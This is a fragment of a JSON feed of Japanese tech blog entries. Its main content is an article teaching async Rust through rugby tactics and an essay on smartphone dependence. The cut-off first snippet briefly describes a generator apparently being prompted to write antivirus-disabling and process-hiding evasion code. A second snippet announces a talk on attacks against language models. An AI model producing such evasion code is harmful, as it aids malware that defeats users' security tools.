ウイルス対策を無効化したりプロセスリストに隠れたりするなど、検出を妨害する回避アクションを実行するためのコードをジェネレーターに作成す...","isoDate":"2025-11-09T05:04:49.000Z","dateMiliSeconds":1762664689000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"LT参加記録：言語モデルに対する攻撃とその予防策について","link":"https://zenn.dev/akasan/articles/95e0b612534bb5","contentSnippet":"今回は、先日タイトルの通り「言語モデルに対する攻撃とその予防策について」という題目でLT登壇してきたので、その紹介になります。資料は以下にアップロードしてあります。https://speakerdeck.com/akasan/yan-yu-moderunidui-surugong-ji-tosonoyu-fang-ce-nituite以下、本発表の概略になります。 LTを実施したモチベーション言語モデルは様々なコンポーネントから構成されており、例えば以下が挙げられます。LLMそのものMCPサーバ/クライアントエージェントVector DBなどのDBクラウドインフラ/...","isoDate":"2025-11-08T13:19:50.000Z","dateMiliSeconds":1762607990000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"スタンドオフに学ぶ非同期プログラミング - 待ち時間を無駄にしない技術","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/08/150836","contentSnippet":"はじめに最近、自分が書く文章が妙に真面目というか、ちゃんと役に立つことばかり意識していることに気づいた。もちろんそれは悪いことじゃないと思う。でも、たまには「これ、本当に誰かの役に立つのかな」と自分でも首を傾げるような文章を書いてみたくなった。書いてみたら、思ったより長くなった。後悔はしていない。たぶん。「非同期って結局なんなの」という疑問を、async/awaitの文法で真面目に説明するのではなく、ラグビーのSO（スタンドオフ）の動きで説明してみようと思う。誰もこんなこと考えなかっただろうし、もし考えた人がいたとしても、文章にはしなかったはずだ。ラグビーを知らない人は「？？？」となるかもしれない。でも安心してほしい。ラグビーを知っている人も同じくらい「？？？」となっているから。読み終わる頃には、非同期とラグビーの近代戦術が（なんとなく）分かるはず。たぶん。きっと。そう信じたい。ラグビーという競技ラグビーは15人制のチームスポーツだ。楕円形のボールを持って走り、パスし、キックして、相手陣地のインゴールにボールを置く（トライする）ことで得点を競う。基本的なルールとして、ボールは前にパスできない。横か後ろにしかパスできない。ボールがタッチラインの外に出るか、反則があるまで、プレーは連続する。タックルされた後も、ボールを確保して攻撃を継続できるフェーズプレーがある。試合時間は前半40分、後半40分の計80分だ。www.rugby-japan.jpこの競技の特徴は、戦況が刻一刻と変化することだ。相手のディフェンスライン、味方の位置、疲労度などを瞬時に判断して、次の一手を決める必要がある。参考：ラグビーフットボール - Wikipediawww.youtube.comスタンドオフ（SO / フライハーフ）の役割スタンドオフは、背番号10番をつける「司令塔」だ。サッカーで言えば10番の司令塔、野球で言えば捕手のような存在。SOの主な責任は、攻撃の組み立て、戦術の選択、コミュニケーション、そしてゲームコントロールだ。どこに攻めるか、どう崩すかを判断する。ランか、パスか、キックか。フォワードとバックスの橋渡し。試合全体のテンポと流れを管理する。重要なのは、SOはボールを持っている時間よりも、持っていない時間のほうが長いということだ。スクラムハーフからのパスを待つ1-2秒の間に、SOは多くのことを並行して処理している。ディフェンスラインの読み、味方の配置確認、次の攻撃パターンの選択、風向きの確認、スコア差と残り時間の計算。これらすべてを同時に行う。参考：ラグビーユニオンのポジション - Wikipediawww.youtube.com現代ラグビーの戦術進化1. ポッド（Pod）システムの深化現代ラグビーにおけるポッドシステムは、単なる戦術ではなく、チーム全体を貫く哲学となっている。2025年に入り、このシステムはより小さく、より速く、より柔軟に進化した。伝統的なポッドは3人のフォワードで構成されていたが、現代では2人のミニポッドも一般的だ。これはLightning Quick Ball（0から3秒以内でのボール再開）という新しい要請に応えるものだ。ブレイクダウン後にポッドが形を整えるのを待つ時間はない。ディフェンスが体制を整える前に、次の攻撃を仕掛ける。参考：Modern Pod System with LQBあるポッドがボールを運んでコンタクトに入る瞬間、他のポッドはすでに次のフェーズのために移動を開始している。これは単なる物理的な移動ではない。各プレイヤーは、フィールド上の70メートルを5つから6つのゾーンに分割し、自分の担当エリアを常に意識している。ボールが自分のゾーンに入ってきたら、即座に反応する。他のゾーンにあるときは、次のフェーズに備えて静かに準備を進める。この「一人はみんなのために」というコンセプトは、非同期プログラミングの本質そのものだ。各ポッドは独立したタスクとして機能しながら、全体として1つの攻撃を構成する。あるポッドがActive状態でボールを運んでいるとき、別のポッドはRepositioning状態で次の位置へ移動し、さらに別のポッドはReady状態で待機している。それぞれが異なる状態にありながら、スタンドオフという「エグゼキュータ」の指揮の下、協調した動きを見せる。以下のコードは概念を示すための擬似コード的な例です。実際に動作する完全版は記事の最後に掲載しています。// 現代のポッドシステムの状態管理async fn modern_pod_attack_2025() {    let field = Field::divide_into_zones(6);    // 各ポッドが独立したタスクとして動作    let pod_tasks: Vec<_> = field.zones        .iter()        .map(|zone| {            tokio::spawn(async move {                loop {                    let ball_state = zone.monitor_ball_position().await;                    match ball_state {                        BallPosition::InMyZone => {                            // 即座に反応                            tokio::time::timeout(                                Duration::from_secs(3),                                execute_pod_action()                            ).await                        }                        BallPosition::Adjacent => {                            // 準備を開始                            prepare_for_next_phase().await                        }                        BallPosition::Distant => {                            // 待機しながら観察                            maintain_shape_awareness().await                        }                    }                }            })        })        .collect();    // すべてのポッドが並行して動作    futures::future::join_all(pod_tasks).await;}2. シェイプの流動化2025年のラグビーで最も劇的な変化の1つは、固定シェイプからの脱却だ。かつては1-3-3-1や2-4-2といった明確なフォーメーションが試合を通じて維持されていた。しかし現代のゲームは、これらを「参照点」として扱い、状況に応じて瞬時に形を変える。参考：Rugby Formations: 1-3-3-1 vs 2-4-21-3-3-1システムは、スクラムハーフから直接ポッドへボールが渡される「playing off 9」のアプローチを特徴とする。これは高速で直線的な攻撃を可能にし、フェーズごとのパス数を最小限に抑える。中央のポッドがボールを受け取ると、4つの選択肢が生まれる。自分でボールを運ぶか、内側の選手にポップパスを出すか、外側にティップするか、あるいは後ろのオプション選手にピボットしてパスを出すか。この判断は0.5秒以内に行われる。一方で2-4-2システムは、フライハーフを介する「playing off 10」のアプローチを採用する。中央へ4人のポッドを配置することで、サイドへの展開速度が33パーセント向上する。研究によれば、1-3-3-1のチームが反対サイドのタッチラインまで平均3フェーズかかるのに対し、2-4-2のチームは2フェーズで到達できる。80分の試合では、この差が攻撃機会の質と量へ大きく影響する。参考：Crusaders Game Plan: 2-4-2 Secretsしかし2025年の現実は、これらのシステムが純粋な形で存在することはほとんどない。あるフェーズでは1-3-3-1に見え、次のフェーズでは2-4-2に見え、その次には全く異なる形になっている。これは混乱ではなく、適応だ。ディフェンスの配置、疲労度、スコア差、残り時間など、すべての変数が瞬時に計算され、最適な形が選択される。// 動的なシェイプ適応システムasync fn adaptive_shape_system() {    let mut current_shape = FormationType::OneThreeThreeOne;    loop {        let situation = assess_game_situation().await;        // 複数の要因を並行して評価        let (defense_analysis, fatigue_check, position_eval) = tokio::join!(            analyze_defense_line(),            check_player_fatigue(),            evaluate_field_position(),        );        // 状況に応じて最適なシェイプを選択        let optimal_shape = match situation {            Situation::QuickBall { defense: Disorganized } => {                // ディフェンスが乱れているなら、現在の形で即座に攻撃                current_shape            }            Situation::SlowBall { defense: Organized } => {                // 時間があるなら、最適な形に再編成                if position_eval.is_central() {                    FormationType::TwoFourTwo // 幅広い攻撃                } else {                    FormationType::OneThreeThreeOne // 直線的攻撃                }            }            Situation::Transition { .. } => {                // 過渡期は流動的な形                FormationType::Fluid            }        };        if optimal_shape != current_shape {            transition_to_new_shape(optimal_shape).await;            current_shape = optimal_shape;        }        execute_phase(current_shape).await;    }}3. 2025年のトレンド興味深いことに、2025年のラグビーは、最も古典的な戦術の1つであるドロー＆パスの復権を目撃している。これは、ボールキャリアがディフェンダーを引きつけ、そのディフェンダーがコミットした瞬間にパスを出すという、極めてシンプルな技術だ。参考：The Evolution of Rugby Tactics in 2025しかしこのシンプルさこそが、複雑化した現代ラグビーにおいて効果を発揮している。過度に複雑化した攻撃パターン、過剰なデコイランナー、計算され尽くしたムーブ。これらすべてに対して、純粋な技術と判断力に基づくドロー＆パスは、予測不可能性という武器を持つ。この戦術の本質は、ディフェンダーの「肩」を読むことにある。ディフェンダーの肩の向きは、彼らが次にどちらに動くかを示している。その弱い肩側に攻撃を仕掛ければ、タックルの威力は半減する。これは瞬時の観察と判断を要求する。まさに非同期プログラミングにおける「ノンブロッキングIO」の概念と同じだ。ディフェンダーの反応を「待つ」のではなく、その動きを「観察しながら」次の行動を準備する。// ドロー＆パスの判断ロジックasync fn draw_and_pass_decision() {    // ボールを持って前進    let carrier_movement = advance_with_ball();    // 並行してディフェンダーを観察    let defender_analysis = tokio::spawn(async {        loop {            let shoulder_direction = observe_defender_shoulder().await;            let commitment_level = assess_commitment().await;            if commitment_level > THRESHOLD {                return DecisionPoint::PassNow(shoulder_direction);            }            tokio::time::sleep(Duration::from_millis(50)).await;        }    });    // ボールキャリアとディフェンダー分析を並行実行    tokio::select! {        _ = carrier_movement => {            // コンタクトに入ってしまった            BreakdownAction::SecureBall        }        decision = defender_analysis => {            // ディフェンダーがコミットした            match decision.unwrap() {                DecisionPoint::PassNow(weak_shoulder) => {                    execute_pass_to_gap(weak_shoulder).await                }            }        }    }}4. コンテスタブルキック2025年のラグビーにおいて、コンテスタブルキック（contestable kick）は単なる戦術オプションから、ゲームプランの中核へと進化した。これは、キックしたボールを自チームが奪還できる可能性のあるキックを指す。クロスフィールドキック、ボックスキック、グラバーキック。これらすべてが、現代の試合で頻繁に見られる。クロスフィールドキックの実行を考えてみよう。フライハーフがボールを受け取り、ディフェンスラインを一瞥する。反対サイドのウイングは、すでにタッチライン際で準備を整えている。キックが蹴られる瞬間、ウイングは全力でチェイスを開始する。ボールが空中にある2秒から3秒の間に、ウイングは15メートルから20メートルを走り、相手のウイングよりも早くボールの落下地点に到達しなければならない。これは非同期操作の好例だ。キックの実行とチェイスの開始は同時に行われる。さらに、他のフォワードも並行してサポートポジションへ移動する。ボールがキャッチされた瞬間、そこには攻撃態勢が整っている。もしくは、相手がキャッチに失敗すれば、即座にターンオーバーのチャンスが生まれる。// クロスフィールドキックの並行実行async fn crossfield_kick_play() {    // キックの準備と実行    let kick_execution = async {        let target_position = calculate_optimal_landing_spot().await;        execute_crossfield_kick(target_position).await    };    // ウイングのチェイス    let wing_chase = async {        // キックのモーションを検知したら即座に開始        wait_for_kick_trigger().await;        sprint_to_landing_spot().await;        compete_for_ball().await    };    // フォワードのサポート    let forward_support = async {        // キックと同時にサポートポジションへ        move_to_support_position().await;        prepare_for_breakdown().await    };    // その他のバックスの再配置    let backs_realignment = async {        reposition_for_second_phase().await    };    // これらすべてが並行して実行される    tokio::join!(        kick_execution,        wing_chase,        forward_support,        backs_realignment    );}5. モメンタムベースのラグビー現代ラグビーのもう1つの重要な概念が「モメンタム」だ。これは物理的な勢いだけでなく、心理的、戦術的な優位性の連鎖を指す。一度モメンタムを得たチームは、それを維持し続けることで相手を圧倒する。モメンタムの獲得は、しばしばブレイクダウンでの優位性から始まる。素早くボールを確保し、3秒以内に次のフェーズを開始する。ディフェンスは体制を整える時間がない。次のフェーズも同様に速い。そしてまた次も。3フェーズ、4フェーズ、5フェーズと連続して攻撃が続くと、ディフェンスは徐々に後退を始める。疲労が蓄積し、判断力が鈍る。そこにギャップが生まれ、トライのチャンスが訪れる。これを非同期システムで表現するなら、各フェーズは前のフェーズの完了を待たずに準備を開始する。パイプライン処理のように、連続したタスクが重なり合いながら実行される。// モメンタムベースの連続攻撃async fn momentum_based_attack() {    let mut phase_count = 0;    let mut momentum_level = 0;    loop {        let phase_start = Instant::now();        // 現在のフェーズを実行しながら、次のフェーズを準備        let (current_phase, next_preparation) = tokio::join!(            execute_current_phase(phase_count),            prepare_next_phase(phase_count + 1)        );        let phase_duration = phase_start.elapsed();        // Lightning Quick Ball（3秒以内）を達成できたか        if phase_duration.as_secs() <= 3 {            momentum_level += 1;            println!(\\"Momentum building: level {}\\", momentum_level);        } else {            momentum_level = momentum_level.saturating_sub(1);            println!(\\"Momentum slowing: level {}\\", momentum_level);        }        // モメンタムが高いほど、ディフェンスにプレッシャー        if momentum_level >= 3 {            // ディフェンスが乱れている可能性が高い            if let Some(gap) = detect_defensive_gap().await {                exploit_gap(gap).await;                break; // トライの可能性            }        }        phase_count += 1;        // ブレイクダウンで負けたら終了        if current_phase.is_turnover() {            break;        }    }}実行可能なコード例についてこの記事のコード例はすべて実際にコンパイル・実行可能で、Rust 2024 Editionのベストプラクティスに準拠しています。Rust 2024 Editionの活用:Prelude改善: FutureとIntoFutureが自動インポートRPIT: Return Position Impl Traitでより簡潔な型シグネチャComprehensive Rustdoc: すべての公開APIに包括的なドキュメントコード品質: cargo clippy -- -D warnings 完全対応完全なプロジェクトをGitHubで公開:# リポジトリをclonegit clone https://github.com/nwiizo/2025-rugby-async-demo.gitcd 2025-rugby-async-demo# 1. メインの例を実行（基本的な非同期処理）cargo run# 2. 高度な例を実行（Rust 2024の機能をフル活用）cargo run --example modern_rugby_2024# 3. 複雑なゲームシミュレーション（現実的な意思決定）cargo run --example complex_game_simulation3つの実装例:基本デモ (cargo run) - スタンドオフの基本的な判断プロセス高度な例 (modern_rugby_2024) - カスタムエラー型と明示的な型定義複雑なシミュレーション (complex_game_simulation)10以上の変数を考慮した現実的な意思決定試合時間、スコア差、フィールドポジション、天候、風、疲労度連続フェーズ数、ペナルティ、イエローカード、ゲームルール7つの主要シナリオに基づく判断ロジックGitHubリポジトリ: https://github.com/nwiizo/2025-rugby-async-demo記事内のコードは教育的な目的で簡略化されています。完全な実装とRust 2024のベストプラクティスについては、GitHubリポジトリを参照してください。試合中の状況判断（コード例）あなたがスタンドオフだとして、攻撃の組み立てを考える。SOは「司令塔」と呼ばれ、刻一刻と変わる状況を見ながら、複数の選択肢を同時に検討し、最適な判断を下す必要がある。攻撃準備フェーズでは、スクラムハーフからのパスを待つ（1-2秒）、ディフェンスラインを読む（継続的）、味方のポジショニングを確認（継続的）する。判断と実行フェーズでは、バックスラインへの展開を指示（3秒）、フォワードへのサインを送る（2秒）、キックのオプションを検討（1秒）する。そして実行フェーズで最適な選択をする。同期的なアプローチ（非効率）すべてを順番に行うと、スクラムハーフからのパスを待つ（2秒）、ディフェンスラインを読む（3秒）、味方のポジショニングを確認（2秒）、バックスの準備を待つ（3秒）、フォワードの準備を待つ（2秒）、判断と実行（1秒）で合計13秒。すでにディフェンスに囲まれています。この方法では、ボールが来るのを待っている間、何も考えない。ディフェンスを読み終わるまで、味方の位置を確認しない。これでは勝てない。非同期的なアプローチ（効率的）use tokio::time::{sleep, Duration};// ディフェンスラインの状態#[derive(Debug, Clone)]struct DefenseLine {    pressure: bool,    gap_on_left: bool,    gap_on_right: bool,}// 味方の状態#[derive(Debug, Clone)]struct Teammates {    backs_ready: bool,    forwards_ready: bool,}async fn wait_for_ball() -> String {    println!(\\"\uD83C\uDFC9 スクラムハーフからのパスを待機...\\");    sleep(Duration::from_secs(2)).await;    println!(\\"✓ ボール受け取り完了\\");    \\"ボール受領\\".to_string()}async fn read_defense() -> DefenseLine {    println!(\\"\uD83D\uDC40 ディフェンスラインを読む...\\");    sleep(Duration::from_secs(1)).await;    let defense = DefenseLine {        pressure: false,        gap_on_left: true,        gap_on_right: false,    };    println!(\\"✓ ディフェンス分析完了: 左にギャップあり\\");    defense}async fn check_teammates() -> Teammates {    println!(\\"\uD83D\uDC65 味方のポジショニング確認...\\");    sleep(Duration::from_millis(800)).await;    let teammates = Teammates {        backs_ready: true,        forwards_ready: true,    };    println!(\\"✓ 味方の準備完了\\");    teammates}async fn signal_backs() {    println!(\\"\uD83D\uDCE2 バックスに展開のサイン...\\");    sleep(Duration::from_millis(500)).await;    println!(\\"✓ バックス準備完了\\");}async fn signal_forwards() {    println!(\\"\uD83D\uDCE2 フォワードにサポートのサイン...\\");    sleep(Duration::from_millis(500)).await;    println!(\\"✓ フォワード準備完了\\");}async fn make_decision(    ball: String,    defense: DefenseLine,    teammates: Teammates) -> String {    println!(\\"\\\\n\uD83E\uDDE0 状況を統合して判断...\\");    if defense.gap_on_left && teammates.backs_ready {        \\"左サイドへパス展開\\".to_string()    } else if !defense.pressure && teammates.forwards_ready {        \\"フォワードにクラッシュボール\\".to_string()    } else {        \\"ハイパントキック\\".to_string()    }}#[tokio::main]async fn main() {    let start = std::time::Instant::now();    println!(\\"=== 攻撃開始 ===\\\\n\\");    // フェーズ1: 情報収集（すべて並行実行）    let (ball, defense, teammates) = tokio::join!(        wait_for_ball(),        read_defense(),        check_teammates()    );    // フェーズ2: サイン出し（並行実行）    tokio::join!(        signal_backs(),        signal_forwards()    );    // フェーズ3: 判断と実行    let decision = make_decision(ball, defense, teammates).await;    let duration = start.elapsed();    println!(\\"\\\\n\uD83C\uDFAF 決定: {}\\", decision);    println!(\\"⏱️  判断までの時間: {:.1}秒\\", duration.as_secs_f64());    println!(        \\"\\\\n\uD83D\uDCA1 並行処理により、順次処理の13秒から{:.1}秒に短縮。\\",        duration.as_secs_f64()    );}優秀なSOは、ボールを待ちながらディフェンスを読み、同時に味方の位置を確認し、複数のオプションを並行して準備している。ボールが手元に来た瞬間には、すでに判断が完了している。これが非同期の本質だ。待っている時間を有効活用する。おわりにここまで読んでくれて、本当にありがとう。途中で「なんでラグビー？」という疑問が何度も頭をよぎったと思う。それでも最後まで付き合ってくれたあなたは、優しい人だ。非同期プログラミングの本質は、「待ち時間を無駄にしない」ことだと思う。スタンドオフがボールを待つ間にディフェンスを読むように。ポッドが独立して動きながら全体として協調するように。クロスフィールドキックと同時にチェイスが始まるように。私たちのコードも、IOを待つ間に他の処理を進めて、複数のタスクを並行して実行して、結果を効率的に統合できる。async/awaitという文法は、単なるシンタックスシュガーじゃない。複雑な並行処理を、人間が理解しやすい形で表現するための抽象化だ。ラグビーのプレーブックが複雑な戦術をシンプルな図で表現するみたいに。非同期プログラミングは、別に難しくない。少なくとも、80分間フィールドを走り回りながら瞬時に判断を下すスタンドオフの仕事よりは、ずっと楽だと思う。座ったままキーボードを叩けるんだから。次にtokio::join!やasync fnを書くとき、もしよかったら、ラグビーフィールドでポッドが動く様子を思い浮かべてみてほしい。きっと、コードの意味がより直感的に理解できる。少なくとも私はそう思う。それじゃあ、良い非同期ライフを。P.S. もしこのブログを読んでラグビーに興味を持ったら、実際の試合を観てみてほしい。スタンドオフの動きを追っていると、「あ、これtokio::select!だ」とか思えるようになる。たぶん。P.P.S. もしこのブログを読んでRustに興味を持ったら、The Rust Programming Languageを読んでみてほしい。非同期の章を読むとき、きっとラグビーのことを思い出すはず。たぶん。Async Rust ―高いパフォーマンスと安全性を両立するRustによる非同期処理作者:Maxwell Flitton,Caroline Mortonオーム社Amazon","isoDate":"2025-11-08T06:08:36.000Z","dateMiliSeconds":1762582116000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"短編：claude codeに改めて私のテックブログを評価させてみた","link":"https://zenn.dev/akasan/articles/8409bc0ebb0818","contentSnippet":"今回は、以前claude codeに私のtech blogを評価させてみたのですが、それから数ヶ月経ったので改めて評価させてみました。前回の記事は以下になるので合わせてご覧ください。https://zenn.dev/akasan/articles/af8b26620c9c98 claude codeへの指示今回は前回の記事と同じ以下の指示を利用して評価してもらいました。instruction.md## 分析articlesフォルダ以下に私のテックブログのマークダウンファイルがあります。以下の情報について傾向分析をしてください- どのようなジャンルの記事を出しているか...","isoDate":"2025-11-07T12:43:51.000Z","dateMiliSeconds":1762519431000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Vertex AI Agent Engine を運用していくうえでのノウハウ","link":"https://sreake.com/blog/know-how-to-operate-vertex-ai-agent-engine/","contentSnippet":"1. はじめに はじめまして、Sreake事業部の井上 秀一です。私はSreake事業部にて、SREや生成AIに関するResearch & Developmentを行っています。本記事は、Google Cloud […]The post Vertex AI Agent Engine を運用していくうえでのノウハウ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-07T09:42:52.000Z","dateMiliSeconds":1762508572000,"authorName":"Sreake","authorId":"Sreake"},{"title":"2025-11-08 Security JAWS TerraformによるIAM Policy記述ガイド","link":"https://speakerdeck.com/masasuzu/2025-11-08-security-jaws-terraformniyoruiam-policyji-shu-gaido","contentSnippet":"[[IAMスペシャル！]Security-JAWS【第39回】 勉強会 2025年11月08日(土) - connpass](https://s-jaws.connpass.com/event/366395/) の発表資料","isoDate":"2025-11-07T05:00:00.000Z","dateMiliSeconds":1762491600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"おい、スマホを置け","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/07/120351","contentSnippet":"はじめに「本が読めない」――多くの人がそう言います。それも、決して能力の低い人たちではありません。仕事は速く、正確で優秀な人たちです。それなのに、本が読めない。数ページで集中力が切れてしまう。気づくとスマホを見ている。「昔は読めたんですけどね」という声もよく聞きます。昔は確かに読めたのに、今は読めない。そして誰もが「最近集中力が落ちて」と言います。まるで集中力が老化とともに自然に衰えるものだと信じているかのように。よく観察していると、ある共通点が見えてきます。すぐに答えを出そうとする。じっくり考えることをしない。検索して表面的な理解で満足してしまう。「調べればわかるし」と。確かに調べればわかります。でも、それは本当に「わかった」ことになるのでしょうか。複雑な問題を単純化し、わかりやすい結論に飛びつく。白か黒か、正しいか間違っているか、そんな二元論的な答えを求める。グレーゾーンや曖昧さは避けたがる。「結局どっちなんですか？」「要するに何をすればいいんですか？」――思考のプロセスをショートカットして、すぐに使える答えだけを欲しがります。でも考えてみてください。一日に何時間もスマホを触っているのに本が読めないというのは、筋トレもしていないのにベンチプレスが上がらないと言っているようなものです。「時間がなくて」と言う人ほどスマホを見ています。「忙しくて」と言う人ほどタイムラインをスクロールしています。スマホを見ることと本を読むこと――これらは別の筋肉を使う行為です。もちろん実際にそんな筋肉があるわけではありません。比喩です。でも、誰もそんなことは考えません。スマホを見れば見るほど、本を読む筋肉は衰えていきます。しかし誰もそれに気づきません。そして、本が読めなくなることは始まりに過ぎないのです。スマホに依存することで、本来やりたかったことができなくなる。エンジニアは深い技術を学びたかったはずです。でも今は浅い情報を追いかけています。「とりあえず最新情報をキャッチアップしないと」と言いながら。学生は深く学びたかったはずです。ところが今は動画を見続けて一日が終わります。「勉強になる動画だから」と言いながら。結局、本来やりたかったことが見えなくなっているのです。しかし誰もそれに気づきません。気づかないふりをしています。試しに一定期間スマホを見ないでいると、変化が起きます。三日目くらいから集中できる時間が伸びてきます。一ヶ月後にはかなりの時間ぶっ通しで本が読めるようになります。「え、読めた」と驚く。自分でも驚く。そして、もっと重要なことが起きます。「本当は何がしたかったんだっけ」という声が聞こえてくるのです。タイムラインに流れてくる情報に反応していただけの自分に気づく。他人の欲望を模倣していただけの自分に気づく。本当は何がしたかったのかわからなくなっていた自分に気づく。一ヶ月スマホから離れただけで、失われていた自分が戻ってきます。いや、正確には違います。集中力は「失われた」のではなく「奪われている」のです。本来やりたいことは「忘れた」のではなく「覆い隠されている」のです。でも、ほとんどの人は一週間もスマホを置きません。「無理ですよ」と言って、また今日もスマホを見ます。スマホと物理的・心理的な距離を取ることで、あなたは本来の自分を取り戻すことができます。でも、取り戻すかどうかはあなた次第です。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。常時接続の世界で起きていることこの問題を理解するために、いくつかの本を読んだ。そこで知った事実は、想像以上に深刻だった。現代人は一日平均4時間、スマホを使っている。最低でも10分に1回は触れている。一日にタッチする回数は2600回以上。10代の若者の2割は、一日7時間もスマホを使っている。これは単なる「使いすぎ」ではない。私たちの生き方が根本から変わってしまった。スマホを持ち歩くことで、いつでも、どこででも誰かとつながれるようになった。電車の中、トイレの中、布団の中、あらゆる場所で常にインターネットに接続している。ここではないどこかで別の情報を得たり、別のコミュニケーションに参加したりすることが、常に可能になった。この状態を、ある研究者は「常時接続の世界」と呼んだ。常時接続の世界の特徴は、「つながっているのに寂しい」という矛盾だ。いつでも誰かとつながれるはずなのに、孤独感は増している。情報は溢れているのに、何も深く理解していない。忙しく見えるのに、何も達成していない。マルチタスクで生活を取り囲んだ結果、何1つに集中していない希薄な状態が、常態化している。そして重要なのは、これは私たちが選んだことではない、ということだ。かつてスマホは、私たちの生活に合わせていた。今は逆だ。私たちが、スマホに合わせて生きている。三つの罠：なぜスマホを手放せないのかスマホを手放せない理由は、単純ではない。そこには、少なくとも3つの異なる層の罠がある。そして、その罠は年々、巧妙に進化している。第一の罠：即時報酬と遠い報酬の戦い技術書や本が読めなくなる理由。それは、報酬が遠すぎるからだ。技術書を読んで得られる報酬は、何か月も、何年も先にある。理解が深まる。スキルが向上する。難しい問題が解けるようになる。でも、それは今日ではない。今週でもない。来月でもない可能性が高い。一方、スマホを開けば、報酬は即座にやってくる。スクロールすれば、新しい情報が現れる。0.1秒。通知を開けば、誰かのメッセージが読める。0.5秒。動画を再生すれば、面白いコンテンツが始まる。1秒。「いいね」をすれば、誰かの反応が返ってくる。数秒。人間の脳は、即時報酬を優先するように設計されている。これは生存戦略として正しい。目の前の食べ物を食べる。目の前の危険から逃げる。今、この瞬間の行動が、生存を左右する。だから、技術書とスマホを並べたとき、脳は迷わずスマホを選ぶ。意志の問題ではない。脳の仕組みの問題だ。「今すぐ」の報酬と「いつか」の報酬が戦えば、「今すぐ」が勝つ。毎回、勝つ。そして恐ろしいことに、この仕組みは、年々強化されている。スマホのアプリは、この10年で劇的に進化した。しかし、その進化の方向は、ユーザーの役に立つことではない。ユーザーの注意を奪うこと、ユーザーをアプリに留めておくこと、そこに最適化されてきた。無限スクロール。下にスワイプし続ければ、永遠にコンテンツが現れる。終わりがない。区切りがない。「もうやめよう」という判断の機会を、奪っている。自動再生。動画が終われば、次の動画が自動で始まる。止めるという能動的な行動を要求する。何もしなければ、見続けることになる。通知バッジ。赤い丸に数字。未読がある。確認しなければならない。その強迫観念を、作り出している。「引っ張って更新」。物理的な動作が、期待感を高める。何が出てくるか分からない。スロットマシンと同じ仕組み。不確実な報酬が、最も強い依存を生む。これらは、すべて意図的な設計だ。脳科学、心理学、行動経済学の知見を総動員して、「やめられない」体験を作り出している。ある開発者は、内部告発した。「私たちは、ユーザーの時間を奪うことに成功した。そして、その時間で何をするかといえば、広告を見せることだ」。つまり、ポケットからスマホを取り出すたびに、「自分の意思で取り出している」と思っているなら、それは大きな誤解だ。私たちは、何千人もの優秀なエンジニアとデザイナーが設計した「注意を奪う装置」に、操られている。技術書を読もうとする。5分読む。報酬は、まだ来ない。退屈を感じる。スマホを見る。報酬が、すぐに来る。脳が学習する。「技術書より、スマホの方が良い」。この学習が、繰り返される。毎日、何10回も。脳は、即時報酬に最適化されていく。遠い報酬を待つ能力が、衰えていく。これが、技術書や本が読めなくなる直接的な原因だ。スマホは、あなたの時間を奪うために進化してきた。そして今、あなたの脳を、スマホに合わせて作り変えている。第二の罠：欲望の形に最適化された設計スマホは、私たちが思っている以上に、人間の欲望の形に合わせて進化している。人間には、根源的な欲望がある。認められたい。つながりたい。孤独を避けたい。不確実性を解消したい。自分が特別でありたい。他人と比較したい。スマホのアプリは、これらの欲望に、ピンポイントで応えるように設計されている。「いいね」の数。フォロワーの数。再生回数。これらは、「認められたい」という欲望に応える。数字で可視化される。比較できる。競争できる。そして、もっと欲しくなる。レコメンドアルゴリズム。あなたが見たいものを、予測する。あなたが反応するコンテンツを、優先的に表示する。スクロールすればするほど、アルゴリズムは学習する。あなたの欲望の形を、正確に把握していく。そして、あなたが気づかないうちに、あなたの欲望を増幅させる。人間の欲望の大半は、他人の模倣によって引き起こされる。友人が持っているものを、欲しくなる。誰かが評価しているものを、価値があると感じる。誰かが成し遂げたことを、自分もやりたくなる。スマホは、この模倣を極限まで加速させる装置になっている。タイムラインを見れば、誰かが何かを成し遂げている。誰かが何かを手に入れている。誰かが何かを楽しんでいる。24時間、途切れることなく、他人の「成功」が流れてくる。その「誰か」の欲望を、私たちは無意識のうちに模倣する。「自分も同じものが欲しい」「自分も同じ体験がしたい」「自分も同じように成果を出さなければ」。欲望には、二種類ある。薄い欲望は、他人の模倣から生まれる表層的な欲求だ。数日経ったら忘れてしまう。「最新の技術を学ばなきゃ」「あの人みたいに成果を出さなきゃ」「このフレームワークも勉強しなきゃ」。タイムラインに流れてくる情報に反応して生まれる、借り物の欲望。濃い欲望は、自分の内側から湧き上がる、本当に大切なものだ。誰かに言われたからではなく、自分が純粋に面白いと感じること。「OSの仕組みを深く理解したい」「アルゴリズムの美しさを追求したい」「このバグの本質的な原因を突き止めたい」。スマホは、薄い欲望を量産する装置だ。スクロールするたびに、新しい「欲しいもの」が生まれる。新しい「やらなきゃいけないこと」が生まれる。新しい「自分に欠けているもの」が見つかる。ある哲学者は、こう言った。「欲望とは、欲しいものを手に入れるまで不幸でいることを課す、自分との契約だ」。薄い欲望は、次々と新しい「欠けているもの」を作り出す。そして、常に「足りない」という感覚を作り出す。だから、スマホを見続ける。次の「欲しいもの」を探して。満たされることのない渇きを、埋めようとして。この仕組みは、年々精密になっている。アルゴリズムは、あなたが何に反応するかを学習する。あなたがどんなコンテンツで立ち止まるかを記録する。あなたがどんな投稿に「いいね」をするかを分析する。さらに、あなたが最も反応しやすいコンテンツを、優先的に表示する。あなたの欲望を刺激するコンテンツを、的確に届ける。スマホを見るたびに、あなた専用にカスタマイズされた「欲望の形」が、提示される。それは、あなたの濃い欲望ではない。アルゴリズムが増幅した、薄い欲望だ。10年前のウェブサイトは、すべての人に同じコンテンツを表示していた。今は違う。あなたが見ているタイムラインは、隣の人が見ているタイムラインとは、まったく別のものだ。あなたの行動履歴、あなたの興味関心、あなたの感情の揺れ動き。すべてが記録され、分析され、次に表示するコンテンツの選択に使われている。スマホは、あなたの欲望を読み取り、その欲望を刺激し、その欲望を増幅させる。その結果、あなたを画面に留め続ける。こうして、濃い欲望は見失われていく。かつてスマホは、あなたの欲望に合わせていた。今は逆だ。あなたが、スマホが提示する欲望に合